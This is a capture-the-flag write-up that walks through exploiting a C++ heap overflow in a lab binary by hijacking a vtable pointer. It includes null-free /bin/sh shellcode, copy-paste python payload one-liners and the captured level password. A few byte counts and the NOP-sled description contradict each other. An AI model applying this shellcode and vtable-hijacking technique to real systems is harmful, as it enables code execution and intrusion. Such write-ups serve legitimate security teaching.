# 🎯 Level9 - C++ Vtable Hijacking with Null-Byte Constraints

![Helldivers C++ Warfare](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExbWpoMWQ4cjQ0ZWU0M2hraHpsenloM2E4eTN4Y3hpaTIwZHgybmVpZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/rTAVMVAps9zsFINvxI/giphy.gif)

Object-oriented exploitation - hijack virtual function tables! 🔥

## 📋 Binary Analysis

### 🎯 Class N Structure

```cpp
class N {
public:
    // Memory layout (108 bytes total):
    // Offset 0x00: vtable pointer (4 bytes) - set by compiler
    // Offset 0x04: annotation buffer (100 bytes)
    // Offset 0x68: int value (4 bytes)
    
    char annotation[100];  // Buffer at offset +4 (after vtable pointer)
    int value;             // Integer value at offset +104
    
    N(int n);
    void setAnnotation(char *str);
    int operator+(N &other);
    int operator-(N &other);
};
```

### 🎯 Key Methods

**Constructor:**
```cpp
N::N(int n)
{
    value = n;  // Vtable pointer automatically set to 0x08048848
}
```

**setAnnotation (VULNERABLE!):**
```cpp
void N::setAnnotation(char *str)
{
    memcpy(annotation, str, strlen(str));  // ⚠️ No bounds checking - overflow!
}
```

**Virtual Functions:**
```cpp
int N::operator+(N &other)
{
    return value + other.value;
}

int N::operator-(N &other)
{
    return value - other.value;
}
```

**Main Function:**
```cpp
int main(int argc, char **argv)
{
    if (argc < 2) {
        _exit(1);
    }
    
    N *obj1 = new N(5);  // Allocated on heap at ~0x804a008
    N *obj2 = new N(6);  // Allocated on heap at ~0x804a078 (108 bytes after)
    
    obj1->setAnnotation(argv[1]);  // ⚠️ Overflow can reach obj2's vtable!
    
    obj2->operator+(*obj1);  // ⚠️ Calls via vtable - uses corrupted pointer!
    
    return 0;
}
```

### 🔑 Key Addresses

| Element | Address | Notes |
|---------|---------|-------|
| **Vtable for N** | `0x08048848` | Function pointer table |
| **N::operator+** | `0x0804873a` | First virtual function (called) |
| **N::operator-** | `0x0804874e` | Second virtual function (unused) |
| **obj1 (heap)** | `0x0804a008` | First object allocation |
| **obj2 (heap)** | `0x0804a078` | Second object (112 bytes after) |

**Key Observations:**
- C++ program with virtual functions (vtable-based dispatch)
- Two objects allocated consecutively on heap
- `setAnnotation()` has no bounds checking
- Virtual function called through obj2's vtable after overflow
- `strlen()` limitation: stops at null bytes

## 🚨 The Challenge

This is the first **C++ object-oriented exploitation** challenge, introducing **vtable hijacking**.

**The Setup:**
```cpp
obj1 = new N(5);              // 108 bytes at 0x804a008
obj2 = new N(6);              // 108 bytes at 0x804a078 (112 bytes later)
obj1->setAnnotation(argv[1]); // Overflow from obj1 into obj2!
(*obj2) + (*obj1);            // Call virtual function through obj2's vtable
```

**The Vulnerability:**
```cpp
__n = strlen(param_1);                  // Gets length (stops at \x00)
memcpy((char *)this + 4, param_1, __n); // Copies without bounds check
```

**The Problem:**
- Annotation buffer is only 100 bytes (at offset 4)
- obj2 is 108 bytes away from obj1's annotation buffer
- If argv[1] is longer than 108 bytes → **overflows into obj2!**
- Can overwrite obj2's vtable pointer at the start of obj2

**The Goal:**
Overflow obj1's annotation buffer to overwrite obj2's vtable pointer, redirecting the virtual function call to execute our shellcode.

**The Challenge:**
`strlen()` stops at null bytes, so we need:
1. Shellcode without null bytes
2. Addresses without null bytes in our payload

## 🎯 How the Exploit Works

### Understanding C++ Virtual Functions

**What is a Vtable?**

In C++, classes with virtual functions use a **Virtual Function Table (vtable)**:
- A table of function pointers stored in the binary
- Each object contains a pointer to this vtable (first 4 bytes)
- Virtual function calls are indirect: `object->vtable[index]()`

**Normal Execution:**
```
obj2->operator+(obj1):
  1. Load obj2's vtable pointer (at obj2 + 0)
  2. Read first entry: vtable[0] = 0x0804873a (operator+)
  3. Call the function: operator+(obj2, obj1)
  4. Returns: 6 + 5 = 11
```

**Vtable Structure:**
```
Vtable for N at 0x08048848:
┌──────────────────────────┐
│ 0x08048848: 0x0804873a   │ → N::operator+
│ 0x0804884c: 0x0804874e   │ → N::operator-
└──────────────────────────┘
```

### Class N Memory Layout

```
Class N Object (108 bytes):
┌─────────────────────────────────────────────────┐
│ Offset 0x00: [vtable pointer]         (4 bytes) │
│ Offset 0x04: [annotation buffer]   (100 bytes)  │
│ Offset 0x68: [int value]              (4 bytes) │
└─────────────────────────────────────────────────┘
Total: 0x6c (108 bytes)
```

### Heap Layout Discovery

Using `ltrace` to see allocations:

```bash
$ ltrace ./level9 AAAA

_Znwj(108, ...)  = 0x804a008  ← obj1 allocated
_Znwj(108, ...)  = 0x804a078  ← obj2 allocated (112 bytes later)
strlen("AAAA")   = 4
memcpy(0x0804a00c, "AAAA", 4)
```

**Distance calculation:**
```
obj1:                   0x804a008
obj1 annotation buffer: 0x804a00c (obj1 + 4)
obj2:                   0x804a078
obj2 vtable pointer:    0x804a078 (obj2 + 0)

Distance: 0x804a078 - 0x804a00c = 0x6c = 108 bytes
```

### Visual: Heap Memory Layout

```
AFTER ALLOCATION:
═══════════════════════════════════════════════════════════════════
0x804a008: ┌──────────────────────────────────────────────────┐
           │ obj1 (108 bytes)                                 │
           ├──────────────────────────────────────────────────┤
           │ [0x08048848] ← vtable pointer                    │
0x804a00c: │ [annotation buffer - 100 bytes]                  │ ← setAnnotation writes here
           │                                                  │
           │                                                  │
0x804a070: │ [int value = 5]                                  │
           └──────────────────────────────────────────────────┘

0x804a074: [4 bytes heap metadata]

0x804a078: ┌──────────────────────────────────────────────────┐
           │ obj2 (108 bytes)                        ← TARGET!│
           ├──────────────────────────────────────────────────┤
           │ [0x08048848] ← vtable pointer WE WANT TO OVERWRITE
0x804a07c: │ [annotation buffer - 100 bytes]                  │
           │                                                  │
0x804a0e0: │ [int value = 6]                                  │
           └──────────────────────────────────────────────────┘


AFTER OVERFLOW:
═══════════════════════════════════════════════════════════════════
0x804a00c: [NOP NOP NOP ... shellcode ... NOP NOP NOP ...]
           ↑
           │ (108 bytes of controlled data)
           │
0x804a078: [0x0804a07c] ← Overwritten! Now points to fake vtable
0x804a07c: [0x0804a01c] ← Fake vtable entry pointing to our shellcode

When operator+ is called:
  obj2->vtable = 0x0804a07c
  obj2->vtable[0] = 0x0804a01c ← Points to our NOP sled!
  Jump to 0x0804a01c → NOP slide → SHELLCODE! 🎉
```

### The Null Byte Problem

**Challenge:** `strlen()` stops at null bytes, but:
- Most function addresses contain `\x00` (e.g., `0xb7da8060`)
- Traditional shellcode contains null bytes
- We need everything to be null-free!

**Solution:**
1. Use **null-byte-free shellcode**
2. Choose addresses **within our payload** that don't have null bytes
3. Use a **NOP sled** for imprecise targeting

### Null-Free Shellcode

We use the same null-byte-free shellcode from **level2** (24 bytes):

```
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

**Properties:**
- ✅ No null bytes
- ✅ Executes `/bin/sh`
- ✅ Only 24 bytes long

> 💡 For detailed shellcode analysis and assembly breakdown, see [level2 documentation](../../level2/Ressources/README.md#the-shellcode).
>
> **Source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428) by Touhid M.Shaikh

### The Attack Strategy

**Payload Structure:**
```
[24-byte shellcode] + [84 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
        ↑                ↑              ↑                   ↑
      0-23            24-107         108-111            112-115
```

**Detailed Breakdown:**

1. **Bytes 0-23 (24 bytes):** Null-free shellcode
   - Placed at start: `0x804a00c`
   - Executes `/bin/sh` immediately
   - No NOP sled needed - direct execution

2. **Bytes 24-107 (84 bytes):** NOP padding (`\x90` * 84)
   - Fills remaining space to reach obj2's vtable
   - Brings us to exactly 108 bytes

3. **Bytes 108-111 (4 bytes):** Fake vtable pointer = `\x7c\xa0\x04\x08`
   - Overwrites obj2's vtable pointer
   - Points to `0x804a07c` (our fake vtable location)
   - No null bytes! ✅

4. **Bytes 112-115 (4 bytes):** Shellcode address = `\x0c\xa0\x04\x08`
   - This becomes our fake vtable entry
   - Points to `0x804a00c` (start of payload - where shellcode is!)
   - No null bytes! ✅

### Address Selection

Why `0x804a00c` and `0x804a07c`?

```
Shellcode location:   0x804a00c (byte 0 - start of payload)
Target address:       0x804a00c ← Shellcode starts here

Encoded: \x0c\xa0\x04\x08
All bytes: 0x0c ✅, 0xa0 ✅, 0x04 ✅, 0x08 ✅
No null bytes!

Fake vtable location: 0x804a07c (where we write the shellcode address)
Encoded: \x7c\xa0\x04\x08
All bytes: 0x7c ✅, 0xa0 ✅, 0x04 ✅, 0x08 ✅
No null bytes!
```

### Complete Execution Flow

```
Step 1: Program Start
─────────────────────
./level9 [PAYLOAD]
argv[1] = 128 bytes (NOPs + shellcode + padding + addresses)


Step 2: Object Allocation
─────────────────────────
obj1 = new N(5);
  malloc(108) = 0x804a008
  vtable = 0x08048848
  value = 5

obj2 = new N(6);
  malloc(108) = 0x804a078
  vtable = 0x08048848
  value = 6


Step 3: setAnnotation Call - THE OVERFLOW
──────────────────────────────────────────
obj1->setAnnotation(argv[1]);

__n = strlen(argv[1]);
  Calculates length (stops at first null, but our payload has none)
  __n = 116 bytes

memcpy(0x804a00c, argv[1], 116);
  Destination: obj1 + 4 = 0x804a00c
  Source: argv[1] = [shellcode + padding + addresses]
  Length: 116 bytes
  
  Writes:
    0x804a00c-0x804a023: Shellcode (24 bytes)
    0x804a024-0x804a077: NOPs (84 bytes)
    0x804a078-0x804a07b: \x7c\xa0\x04\x08 ← OVERWRITES obj2->vtable!
    0x804a07c-0x804a07f: \x0c\xa0\x04\x08 ← Creates fake vtable entry

Result: obj2->vtable = 0x0804a07c (our fake vtable!)


Step 4: Virtual Function Call - HIJACKED!
──────────────────────────────────────────
(*obj2) + (*obj1);

Normal behavior would be:
  Load obj2->vtable → 0x08048848
  Call vtable[0] → N::operator+

Hijacked behavior:
  Load obj2->vtable → 0x0804a07c ← Our fake vtable!
  Call vtable[0] → Read 0x0804a07c
  Value at 0x0804a07c: 0x0804a00c ← Our shellcode address!
  Jump to 0x0804a00c


Step 5: Shellcode Execution
────────────────────────────
CPU jumps to 0x0804a00c:
  Executes shellcode immediately (no NOP sled)
  Executes: execve("/bin//sh", NULL, NULL)


Step 6: Shell Spawned! 🎉
──────────────────────────
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

### Why This Works

| Requirement | Status | Explanation |
|-------------|--------|-------------|
| **Heap overflow** | ✅ | No bounds check in setAnnotation |
| **Sequential allocation** | ✅ | obj1 and obj2 allocated 112 bytes apart |
| **Vtable overwrite** | ✅ | Overflow reaches obj2's vtable at offset 108 |
| **Virtual call** | ✅ | operator+ is called through vtable |
| **Null-free payload** | ✅ | All shellcode and addresses avoid \x00 |
| **Valid addresses** | ✅ | Point to heap locations within our buffer |
| **Executable heap** | ✅ | No DEP/NX protection on this system |
| **Fixed addresses** | ✅ | ASLR disabled, heap addresses predictable |

### Key Insight

**Exploit Evolution - Object-Oriented Exploitation:**

Previous levels exploited procedural code:
- Buffer overflows → overwrite return addresses
- Format strings → overwrite GOT entries
- Heap corruption → overwrite function pointers

Level9 introduces **C++ OOP exploitation**:
- **Vtable hijacking** - redirecting virtual function calls
- **Object layout manipulation** - understanding C++ memory model
- **Null-byte constraints** - working with strlen limitations
- **Heap feng shui** - precise object placement

**Why C++ exploitation is different:**
- Objects have **structured layouts** with vtables and members
- Virtual functions use **indirect calls** through vtables
- Vtables are **per-class**, but each object has a vtable pointer
- Overwriting a vtable pointer affects **one object**, not all instances
- Modern C++ has **RTTI** (type info) that can detect corruption

**Real-world relevance:**
- Browser exploitation (JavaScript engines, DOM objects)
- Game engines (UnrealScript, Unity)
- System services written in C++ (Windows, macOS)
- Modern mitigations: CFI (Control Flow Integrity), vtable verification

## 💣 Execute the Exploit

**Multi-line version (recommended):**
```bash
python -c '
SHELLCODE = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = SHELLCODE + "\x90" * 84 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"
print payload
' | xargs ./level9
```

**One-liner (quick copy-paste):**
```bash
./level9 $(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*84 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"')
```

**Expected output:**
```bash
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

**Payload breakdown:**
```
\x31\xc0\x99...\xb0\x0b\xcd\x80    = Null-free shellcode (24 bytes)
\x90 * 84                           = NOP padding (84 bytes)
\x7c\xa0\x04\x08                   = Fake vtable pointer (4 bytes)
\x0c\xa0\x04\x08                   = Shellcode address (4 bytes)
Total: 116 bytes

Shellcode source: Exploit-DB #42428 by Touhid M.Shaikh
```

---

> 💡 **Pro Tip**: When exploiting C++ programs, always check the vtable layout first. Understanding the object model is key to crafting precise exploits!

> ⚠️ **Security Note**: Modern C++ protections against vtable hijacking:
> - **CFI (Control Flow Integrity)** - Validates vtable pointers before use
> - **Vtable Verification** - Checks vtable belongs to expected class
> - **Read-only Vtables** - Places vtables in read-only memory
> - **Safe Virtual Dispatch** - Uses hardened calling conventions
> - **ASAN/UBSAN** - Detects memory corruption in development
> 
> **Safe C++ practices:**
> - Use `std::string` instead of C-style strings
> - Enable all compiler warnings and sanitizers
> - Use smart pointers to avoid manual memory management
> - Prefer `std::vector` over raw arrays
> - Enable modern protections: CFI, SafeStack, shadow call stack

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
